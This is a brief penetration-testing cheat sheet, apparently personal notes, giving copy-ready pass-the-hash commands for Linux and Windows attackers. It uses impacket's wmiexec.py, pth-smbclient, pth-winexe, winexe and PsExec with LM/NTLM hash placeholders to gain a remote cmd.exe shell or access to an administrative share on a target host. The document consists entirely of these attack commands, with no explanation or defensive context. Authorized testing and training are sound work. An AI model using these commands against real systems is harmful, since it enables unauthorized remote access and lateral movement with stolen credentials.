# linux attacker

## pass the hash (wmiexec)

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes <lmhash>:<ntlmhash> <user>@<rhost> cmd.exe
```

## pass the hash (smb; pth-smbclient)

```bash
pth-smbclient //<rhost>/<share(c$)> -U <PCNAME>/<user>%<lmhash>:<ntlmhash>
```

## pass the hash (pth-winexe)

```bash
pth-winexe -U <Administrator/user>%<lmhash>:<ntlmhash> //<rhost> cmd.exe
```

## pass the hash (winexe)

```bash
winexe -U '<administrator/user>%<lmhash>:<ntlmhash>' //<rhost> cmd.exe
```

# windows attacker

## pass the hash (psexec.exe)

```cmd
.\PsExec.exe -accepteula -u <administrator/user> -p <lmhash>:<ntlmhash> cmd.exe
```
